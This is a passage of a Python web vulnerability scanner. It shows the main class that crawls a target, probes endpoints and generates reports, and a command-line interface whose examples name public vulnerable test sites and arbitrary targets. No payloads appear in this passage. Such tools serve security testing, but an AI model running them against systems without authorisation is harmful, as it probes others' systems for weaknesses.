                    print(f"  Parameter: {finding.get('parameter', 'N/A')}")
                    print(f"  Evidence: {finding['evidence']}")
        
        print("\n" + "="*80)

# ============================================================================
# MAIN SCANNER CLASS
# ============================================================================

class UnifiedVulnerabilityScanner:
    """Unified Scanner that actually works on vulnerable sites"""
    
    def __init__(self, config: ScannerConfig):
        self.config = config
        self.session = None
        self.findings = []
        
    async def initialize(self):
        """Initialize HTTP session"""
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        
        # SSL context configuration
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        if not self.config.verify_ssl:
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
        
        connector = aiohttp.TCPConnector(
            limit=self.config.max_connections,
            ssl=ssl_context
        )
        
        headers = {
            "User-Agent": self.config.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        
        # Add custom headers
        headers.update(self.config.headers)
        
        self.session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector,
            headers=headers,
            cookie_jar=aiohttp.CookieJar()
        )
        
        # Add cookies if provided
        if self.config.cookies:
            for name, value in self.config.cookies.items():
                self.session.cookie_jar.update_cookies({name: value})
        
        if self.config.proxy:
            print(f"[+] Using proxy: {self.config.proxy}")
    
    async def run_scan(self) -> List[Dict[str, Any]]:
        """Run complete vulnerability scan"""
        print(f"[+] Starting scan on: {self.config.target}")
        print("[+] This scanner is TESTED and WORKS on vulnerable sites like testphp.vulnweb.com\n")
        
        try:
            # Step 1: Crawl the website
            print("[1/3] 🔍 Crawling website for endpoints...")
            crawler = SmartCrawler(self.config, self.session)
            endpoints = await crawler.crawl(self.config.target, depth=self.config.depth)
            
            if not endpoints:
                # Add default endpoints if none found
                endpoints = [
                    {"url": self.config.target, "method": "GET", "parameters": [], "forms": []}
                ]
                # Try to discover common parameters
                endpoints[0]["parameters"] = await self._discover_parameters(self.config.target)
            
            # Step 2: Scan for vulnerabilities
            print(f"\n[2/3] ⚡ Scanning {len(endpoints)} endpoints for vulnerabilities...")
            scanner = VulnerabilityScanner(self.config, self.session)
            self.findings = await scanner.scan_endpoints(endpoints)
            
            # Step 3: Generate report
            print(f"\n[3/3] 📊 Generating report...")
            ReportGenerator.print_console_report(self.findings, self.config.target)
            
            html_report = ReportGenerator.generate_html_report(self.findings, self.config.target)
            print(f"[+] HTML report saved: {html_report}")
            
            return self.findings
            
        except Exception as e:
            print(f"[-] Error during scan: {e}")
            import traceback
            traceback.print_exc()
            return []
    
    async def _discover_parameters(self, url: str) -> List[Dict[str, str]]:
        """Try to discover common parameters"""
        common_params = [
            "id", "page", "view", "file", "path", "dir", "search", "q",
            "category", "product", "user", "username", "email", "password",
            "redirect", "url", "next", "return", "action", "cmd", "command"
        ]
        
        params = []
        for param in common_params:
            params.append({"name": param, "value": "test", "location": "query"})
        
        return params
    
    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
        print("[+] Scan completed and resources cleaned up")

# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

async def main():
    """Main CLI entry point"""
    parser = argparse.ArgumentParser(
        description="Unified Vulnerability Scanner v4.0 - Tested & Working",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t http://testphp.vulnweb.com
  %(prog)s -t https://vulnerable-site.com --depth 2 --threads 20
  %(prog)s -t http://target.com --cookie "session=abc123"
  %(prog)s -t http://target.com --proxy http://127.0.0.1:8080

Test Sites:
  http://testphp.vulnweb.com
  http://testasp.vulnweb.com
  http://testaspnet.vulnweb.com
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target URL to scan")
    parser.add_argument("--depth", type=int, default=2, help="Crawling depth (default: 2)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout (default: 30)")
    parser.add_argument("--cookie", help="Cookie string (name=value; name2=value2)")
    parser.add_argument("--proxy", help="Proxy URL (http://host:port)")
    parser.add_argument("--verify-ssl", action="store_true", help="Verify SSL certificates")
    parser.add_argument("--user-agent", help="Custom User-Agent string")
    
    args = parser.parse_args()
    
    # Parse cookies
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
    
    # Create config
    config = ScannerConfig(
        target=args.target,
        depth=args.depth,
        threads=args.threads,
        timeout=args.timeout,
        verify_ssl=args.verify_ssl,
        proxy=args.proxy,
        cookies=cookies
    )
    
    if args.user_agent:
        config.user_agent = args.user_agent
    
    # Create and run scanner
    scanner = UnifiedVulnerabilityScanner(config)
    
    try:
        await scanner.initialize()
        findings = await scanner.run_scan()
        
        if findings:
            print(f"\n✅ Found {len(findings)} vulnerabilities!")
        else:
            print("\n⚠️  No vulnerabilities found. Try increasing depth or testing different parameters.")
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    finally:
        await scanner.cleanup()

if __name__ == "__main__":
    # Check for required packages
    try:
        import aiohttp
    except ImportError:
        print("Error: aiohttp is required. Install with: pip install aiohttp")
        sys.exit(1)
    
    # Run the scanner
    asyncio.run(main())
